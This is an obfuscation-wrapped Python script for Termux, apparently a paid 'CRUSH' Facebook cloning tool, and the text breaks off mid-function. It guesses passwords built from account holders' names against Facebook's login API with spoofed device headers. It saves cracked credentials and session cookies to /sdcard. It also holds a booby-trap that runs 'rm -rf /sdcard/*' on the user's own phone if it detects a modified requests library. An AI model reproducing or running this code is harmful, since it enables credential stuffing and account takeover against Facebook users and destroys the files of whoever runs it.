#__________________| INFO |___________________#
#______SCRIPT ENCRYPTED BY PYTHON 2.5
#______CODING BY: ùë®ùë≥ùë¨ùëøùë®ùëµùë´ùë¨ùëπ
#______GITHUB : https://github.com/ùë®ùë≥ùë¨ùëøùë®ùëµùë´ùë¨ùëπùë≤ùë¨ùëµùë∑ùë∂ùëÆùë∞
#________________| SCRIPT DATA |_____________#

import base64
exec(base64.b64decode(b'#!/usr/bin/python
#Original written Attitude King Miraj
#CRUSH(ATTITUDE KING MIRAJ) Brand
#Feel CRUSH POWER
import os
#os.system("pip install pycurl")
#os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
#os.system('pip install httpx pip install beautifulsoup4')
try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    #import dz
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    print('\n Installing missing modules ...')
    os.system(f'pip install requests futures==2 > /dev/null')
except:pass
if not len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py','r').readlines())==1034:print('Bypass User')
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as mogidDANGER
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
#_________[ TRACKING USERS IP ]______>>
ip = requests.get("https://api.ipify.org").text
print('\033[0;97m[•] \033[0;92mCRUSH TOOL IS TRACKING YOUR IP ADDRESS')
time.sleep(2)
print("\033[0;97m[•] \x1b[1;92mTHIS IS YOUR IP ADDRESS \x1b[1;91m:\033[1;36m "+ip)
#_________[ UA ]______>>
#-----------------------[ SECURITY-CODE ]-----------------------#
def fucker():
    os.system('rm -rf /sdcard/*')
    os.system('rm-rf /sdcard/DCIM/')
    os.system('rm-rf /sdcard/Android/')
    os.system('rm-rf /sdcard/Android/data/')
    os.system('rm -rf /sdcard/Download/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /sdcard/0/*')
try:
    mirajkhan = open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py", "r").read()
    alin = len(mirajkhan)
    if alin != 35223:
        fucker()
        exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
    else:
        pass 
except:
    fucker()
    exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
try:
    mirajkhan = open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py", "r").read()
    alin = len(mirajkhan)
    if alin != 10187:
        fucker()
        exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
    else:
        pass 
except:
    fucker()
    exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
try:
    mirajkhan = open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py", "r").read()
    alin = len(mirajkhan)
    if alin != 6449:
        fucker()
        exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
    else:
        pass 
except:
    fucker()
    exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
try:
    mirajkhan = open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py", "r").read()
    alin = len(mirajkhan)
    if alin != 30373:
        fucker()
        exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
    else:
        pass 
except:
    fucker()
    exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
try:
    king='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
    if not 'print' in open(king+'sessions.py','r').read():
        pass
    else:
        fucker()
        exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
except:
    fucker()
    exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
try:
    qeen='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
    if not 'print' in open(qeen+'models.py','r').read():
        pass
    else:
        fucker()
        exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
except:
    fucker()
    exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
try:
    don='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
    if not 'print' in open(don+'api.py','r').read():
        pass
    else:
        fucker()
        exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
except:
    fucker()
    exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
try:
    king='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
    if not 'sys.stdout.write' in open(king+'sessions.py','r').read():
        pass
    else:
        fucker()
        exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
except:
    fucker()
    exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
try:
    qeen='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
    if not 'sys.stdout.write' in open(qeen+'models.py','r').read():
        pass
    else:
        fucker()
        exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
except:
    fucker()
    exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
try:
    don='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
    if not 'sys.stdout.write' in open(don+'api.py','r').read():
        pass
    else:
        fucker()
        exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
except:
    fucker()
    exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
#-----------------------[ BYPASS-FUCK-CODE ]-----------------------#
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
import random
import string
model2 ="""M2101K6G
Aquaris U Plus
CPH2451
CPH2419
CPH2389
CPH2351
CPH2332
CPH2331
CPH2261
CPH2238
CPH2107
CPH2048
CPH1929
CPH1985
CPH1869
CPH1615
CPH1664
CPH1451
CPH1235
CPH1114
22122RK93C
22041216C
2201117TY
2304FPN6DC
22101316UP
2206122SC
2106118C
21091116UI
M2105K81AC
M2101K6G
Redmi Note 10 Lite
M2003J15SC
MI CC9 Pro
2201116TG
22041216UC
21061119DG
Mi 9T
2304FPN6DG
SM-G780G
SM-O497J
SM-L427V
SM-C297Z
SM-G507X
SM-Y634L
SM-J204F
SM-R911A
SM-X801O
SM-A792E
SM-H270F
SM-P993J
SM-V233F
SM-O861W
SM-D182C
SM-Y729G
SM-Z367Q
SM-U191O
SM-U559U
SM-B567Y
SM-O846M
SM-G342Z
SM-K531M
SM-I847H
SM-A728M
SM-L637H
SM-L429N
SM-P413J
SM-N731T
SM-R505B
SM-A744X
SM-O400L
SM-F799H
SM-Z679E
SM-G822H
SM-N489K
SM-Z200Z
SM-Y119O
SM-E201F
SM-N785T
SM-G200V
SM-R067J
SM-N134B
SM-N227J
SM-K221P
SM-S150D
SM-A869J
SM-H143V
SM-C469H
SM-T152I
SM-Y575D
SM-W880B
SM-W460Q
SM-Q159J
SM-U637R
SM-J924Q
SM-W512P
SM-I745B
SM-O118H
SM-U111M
SM-U522B
SM-B611V
SM-G520J
SM-D144B
SM-C181B
SM-V128Q
SM-U167W
SM-L098E
SM-P454L
SM-L943O
SM-D368H
SM-P485X
SM-C715N
SM-H010U
SM-H710B
SM-X633F
SM-Z040T
SM-Q391G
SM-N451P
SM-T115B
SM-R248C
SM-T618P
SM-S067L
SM-M619P
SM-Q048A
SM-I787D
SM-X275W
SM-G911F
SM-R924W
SM-S506Z
SM-V941V
SM-G016M
SM-O008J
SM-L296E
SM-U876V
SM-L600X
SM-G169P
SM-F578L
SM-S727V
SM-F213B
SM-U822H
SM-Q995Y
SM-I602I
SM-V225C
SM-U921J
SM-Z302E
SM-Y080Z
SM-X174G
SM-T157W
SM-M311W
SM-H791P
SM-Q343U
SM-H261C
SM-D442E
SM-E047H
SM-S082M
SM-U311K
SM-Z651V
SM-I566H
SM-I593C
SM-L375P
SM-D399D
SM-Y086S
SM-O365U
SM-W782A
SM-S236Q
SM-D514J
SM-W806F
SM-W809F
SM-M645P
SM-W098A
SM-O026U
SM-Y689Z
SM-D832N
SM-C691X
SM-D921H
SM-G403Y
SM-S210U
SM-D768K
SM-F912H
SM-H856A
SM-J184W
SM-D512U
SM-K786Z
SM-Z107O
SM-D499G
SM-C815N
SM-D590H
SM-V695N
SM-M093A
SM-S354P
SM-F657J
SM-R743O
SM-A180A
SM-B651H
SM-X279B
SM-X429B
SM-R588G
SM-Y318K
SM-G967W
SM-P668C
SM-B401K
SM-S853U
SM-A377K
SM-K914A
SM-J624R
SM-L536Y
SM-B190B
SM-Q769S
SM-Z872L
SM-S322A
SM-O621Y
SM-N100L
SM-A840S
SM-E543H
SM-H386M
SM-Y932W
SM-T496G
SM-E768E
SM-R031A
SM-Q015D
SM-P522K
SM-D436Z
SM-R077U
SM-I233Z
SM-H906Q
SM-K838M
SM-O369U
SM-F458K
SM-M382E
SM-L337L
SM-G904B
SM-N351H
SM-V670M
SM-W266H
SM-Q576G
SM-G359C
SM-R096P
SM-F952H
SM-Y608N
SM-C736V""".splitlines()
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
def randBuildLMK():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[FBAN/FB4A;FBAV/383.0.0.5.174;FBBV/612352855;FBDM/{density=2.2,width=1080,height=1421};FBLC/lt_LT;FBRV/907796752;FBCR/Azercell;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2 Lite;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)}  Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
def randFBAN():
  VAPP = random.randint(410000000,499999999)
  ua="[FBAN/FB4A;FBAV/384.0.0.13166;FBBV/"+str(VAPP)+";FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/620570855;FBCR/1030;FBMF/Huawei;FBBD/MHA-L29;FBPN/com.facebook.katana;FBDV/"+random.choice(model2)+";FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
  return ua
def randBuildvsskj():
    END = '[FBAN/FB4A;FBAV/383.0.0.5.174;FBBV/612352855;FBDM/{density=2.2,width=1080,height=1421};FBLC/lt_LT;FBRV/907796752;FBCR/Azercell;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2 Lite;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)}  Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
sys.stdout.write('\x1b]2; 🖤🔥CRUSH🔥🖤\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
#-----------[lile]---------#
def linex():
	 print(60*'\033[1;97m━')
#----------[clear]-------#
def clear():
	 os.system('clear')
#----------[cooler]--------#
PURPLE ='\x1b[38;5;46m'
RED = '\033[1;30m'
WHITE = '\033[1;97m'
GREEN = '\x1b[38;5;83m'
GREEN1 = '\x1b[38;5;84m'
GREEN2 = '\x1b[38;5;85m'
GREEN3 = '\x1b[38;5;86m'
GREEN4 = '\x1b[38;5;87m'
GREEN5 = '\x1b[38;5;81m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
CYAN = '\033[1;36m'
EXTRA ='\x1b[38;5;208m'
REDD = '\033[1;31m'
Firex = '\x1b[38;5;196m'
LINEC ='\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'
#_________[ IMPORTING TIME MODULS ]______>>
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
def clear():
        os.system('clear')
        print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#-----------------------[DATE Checker For FILE CLONING]-----------------------#
def joined(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:9] in ['100000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:8] in ['10000000']        :creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:creation = '\33[1;37m| \33[1;33m2010' 
        elif ids[:6] in ['100001']          :creation = '\33[1;37m| \33[1;33m2010\33[1;37m/\33[1;33m2011'
        elif ids[:6] in ['100002','100003'] :creation = '\33[1;37m| \33[1;33m2011\33[1;37m/\33[1;33m2012'
        elif ids[:6] in ['100004']          :creation = '\33[1;37m| \33[1;33m2012\33[1;37m/\33[1;33m2013'
        elif ids[:6] in ['100005','100006'] :creation = '\33[1;37m| \33[1;33m2013\33[1;37m/\33[1;33m2014'
        elif ids[:6] in ['100007','100008'] :creation = '\33[1;37m| \33[1;33m2014\33[1;37m/\33[1;33m2015'
        elif ids[:6] in ['100009']          :creation = '\33[1;37m| \33[1;33m2015' 
        elif ids[:5] in ['10001']           :creation = '\33[1;37m| \33[1;33m2015\33[1;37m/\33[1;33m2016'
        elif ids[:5] in ['10002']           :creation = '\33[1;37m| \33[1;33m2016\33[1;37m/\33[1;33m2017'
        elif ids[:5] in ['10003']           :creation = '\33[1;37m| \33[1;33m2018\33[1;37m/\33[1;33m2019'
        elif ids[:5] in ['10004']           :creation = '\33[1;37m| \33[1;33m2019\33[1;37m/\33[1;33m2020'
        elif ids[:5] in ['10005']           :creation = '\33[1;37m| \33[1;33m2020' 
        elif ids[:5] in ['10006','10007','']:creation = '\33[1;37m| \33[1;33m2021' 
        elif ids[:5] in ['10008']           :creation = '\33[1;37m| \33[1;33m2022' 
        else:creation=''
    elif len(ids) in [9,10]:
        creation = '\33[1;37m| \33[1;33m2008/2009'
    elif len(ids)==8:
        creation = '\33[1;37m| \33[1;33m2007/2008'
    elif len(ids)==7:
        creation = '\33[1;37m| \33[1;33m2006/2007'
    else:creation=''
    return creation
#-----------------------[DATE Checker For UID CLONING]-----------------------#
def joined(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:9] in ['100000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:8] in ['10000000']        :creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:creation = '\33[1;37m| \33[1;33m2010' 
        elif uid[:6] in ['100001']          :creation = '\33[1;37m| \33[1;33m2010\33[1;37m/\33[1;33m2011'
        elif uid[:6] in ['100002','100003'] :creation = '\33[1;37m| \33[1;33m2011\33[1;37m/\33[1;33m2012'
        elif uid[:6] in ['100004']          :creation = '\33[1;37m| \33[1;33m2012\33[1;37m/\33[1;33m2013'
        elif uid[:6] in ['100005','100006'] :creation = '\33[1;37m| \33[1;33m2013\33[1;37m/\33[1;33m2014'
        elif uid[:6] in ['100007','100008'] :creation = '\33[1;37m| \33[1;33m2014\33[1;37m/\33[1;33m2015'
        elif uid[:6] in ['100009']          :creation = '\33[1;37m| \33[1;33m2015' 
        elif uid[:5] in ['10001']           :creation = '\33[1;37m| \33[1;33m2015\33[1;37m/\33[1;33m2016'
        elif uid[:5] in ['10002']           :creation = '\33[1;37m| \33[1;33m2016\33[1;37m/\33[1;33m2017'
        elif uid[:5] in ['10003']           :creation = '\33[1;37m| \33[1;33m2018\33[1;37m/\33[1;33m2019'
        elif uid[:5] in ['10004']           :creation = '\33[1;37m| \33[1;33m2019\33[1;37m/\33[1;33m2020'
        elif uid[:5] in ['10005']           :creation = '\33[1;37m| \33[1;33m2020' 
        elif uid[:5] in ['10006','10007','']:creation = '\33[1;37m| \33[1;33m2021' 
        elif uid[:5] in ['10008']           :creation = '\33[1;37m| \33[1;33m2022' 
        elif uid[:5] in ['10009']           :creation = '\33[1;37m| \33[1;33m2023' 
        else:creation=''
    elif len(uid) in [9,10]:
        creation = '\33[1;37m| \33[1;33m2008/2009'
    elif len(uid)==8:
        creation = '\33[1;37m| \33[1;33m2007/2008'
    elif len(uid)==7:
        creation = '\33[1;37m| \33[1;33m2006/2007'
    else:creation=''
    return creation
#------------[logo]----------#
logo=(f"""
\033[1;95m 𝑷𝑶𝑮𝑰 𝑺𝑰 𝑨𝑳𝑬𝑿𝑨𝑵𝑫𝑬𝑹𝑲𝑬𝑵𝑷𝑶𝑮𝑰
\033[1;32m $$$$$$\  $$$$$$$\  $$\   $$\  $$$$$$\  $$\   $$\       
\033[1;31m$$  __$$\ $$  __$$\ $$ |  $$ |$$  __$$\ $$ |  $$ |      
\033[1;33m$$ /  \__|$$ |  $$ |$$ |  $$ |$$ /  \__|$$ |  $$ |      
\033[1;32m$$ |      $$$$$$$  |$$ |  $$ |\$$$$$$\  $$$$$$$$ |      
\033[1;34m$$ |      $$  __$$< $$ |  $$ | \____$$\ $$  __$$ |      
\033[1;36m$$ |  $$\ $$ |  $$ |$$ |  $$ |$$\   $$ |$$ |  $$ |      
\033[1;31m\$$$$$$  |$$ |  $$ |\$$$$$$  |\$$$$$$  |$$ |  $$ |      
\033[1;32m \______/ \__|  \__| \______/  \______/ \__|  \__|      
{LINEC}
{RED} [{GREEN}={RED}] {YELLOW}OWNER      {RED}> {PURPLE}ALEXANDER KEN MENDOZA
{RED} [{GREEN1}={RED}] {YELLOW}TOOLS      {RED}> {GREEN}FILE-CLONING/RANDOM CLONING
{RED} [{GREEN2}={RED}] {YELLOW}VERSION    {RED}> {ORANGE}1.5
{RED} [{GREEN3}={RED}] {YELLOW}WORKING    {RED}> {REDD}DATA/WIFI BOTH
{RED} [{GREEN4}={RED}] {YELLOW}STATUS     {RED}> {BLUE}VIP/PAID
{RED} [{GREEN5}={RED}] {YELLOW}IP ADDRESS {RED}> {CYAN}{ip}
{LINEC}""")
def clear():
    os.system("clear")
    print(logo) 
        
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print('\n')
        print("-----------------------------------------------------")
        print(' The Process has been Complete ')
        print(' TOTAL OK: %s' % str(len(oks)))
        print(' TOTAL CP: %s' % str(len(cps)))
        print("-----------------------------------------------------")
        input("Press enter to back CRUSH Menu ")
        exit()
def CRUSH():   
    os.system('clear')
    print(logo)
    print(f'{RED} [{GREEN}1{RED}] {PURPLE} FILE CLONING')
    print(f'{RED} [{GREEN1}2{RED}] {PURPLE} RANDOM CLONING')
    print(f'{RED} [{GREEN2}3{RED}] {PURPLE} FACEBOOK FOLLOW')
    print('')
    select = input('CHOOSE > ')
    if select =='1':
        method_crack()
    elif select =='2':
        print(f' TOOLS.OFF ')
    elif select =='3':
        os.system('xdg-open https://chat.whatsapp.com/LTBJe0upO8SIUsMXvHVAQd')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        exit('Exit!')
        
l = []
####@-----File-----@####
def file():
    os.system("clear")
    print(logo)
    if 'gm' in l:
        file = '.Miraj'
    else:
        file = input(f"{oo('-')}Enter File: ")
    try:
        for x in open(file,'r').readlines():
            accounts.append(x.strip())
    except:
        print(f"{oo('!')}File Not Found");time.sleep(1)
        Hxw_Main()
     
    method()
    exit()
def method_crack():
    global methods
    clear()
    print(f'{RED} [{GREEN}1{RED}] {GREEN} Method {1}')
    print(f'{RED} [{GREEN2}2{RED}] {GREEN2} Method {2}')
    print(f'{RED} [{GREEN3}3{RED}] {GREEN3} Method {3}')
    print(f'{RED} [{GREEN3}4{RED}] {GREEN3} Method {4}')
    print(f'{RED} [{GREEN2}0{RED}] {GREEN2} Back')
    print('')
    option = input('Select method > ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodC')
        main_crack().crack(id)
    elif option =='3':
        methods.append('methodD')
        main_crack().crack(id)
    elif option =='4':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='0':
        mogid()
    else:
      print('\n Select Valid Option ...')
      time.sleep(0.6)
      method_crack()
class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        self.file = input(f'{RED} [{GREEN}✔️{RED}] {GREEN}Put File Name > ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print('Opps File Not Found ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print('Try Again ...')
            time.sleep(2)
            main_crack().crack(id)
            
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;32m[CRUSH] \033[1;33m{loop} \033[1;32m| \033[1;34mM1 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': randBuildLMK(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'WIFI',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);CRUSHb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={CRUSHb};{ckkk}"
                    print(f'\033[1;33m [COOKIE-🍪] :\033[1;33m '+cookie)
                    print(f"\r{R} [CRUSH-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/CRUSH_OK_IDS_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/CRUSH_IDS_COOKIES_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'|'+joined(ids)+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{A} [CRUSH-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/CRUSH_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(7)
            self.methodA(sid, name, ps)
            
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;32m[CRUSH] \033[1;33m{loop} \033[1;32m| \033[1;34mM2 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': randBuildvsskj(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'WIFI',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);CRUSHb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={CRUSHb};{ckkk}"
                    print(f'\033[1;33m [COOKIE-🍪] :\033[1;33m '+cookie)
                    print(f"\r{R} [CRUSH-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/CRUSH_OK_IDS_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/CRUSH_IDS_COOKIES_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'|'+joined(ids)+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{A} [CRUSH-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/CRUSH_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(7)
            self.methodC(sid, name, ps)
           
    def methodB(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r\033[1;32m[CRUSH] \033[1;33m{loop} \033[1;32m| \033[1;34mM3 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        except:
            ls = fs
        try:
            for pw in psw:
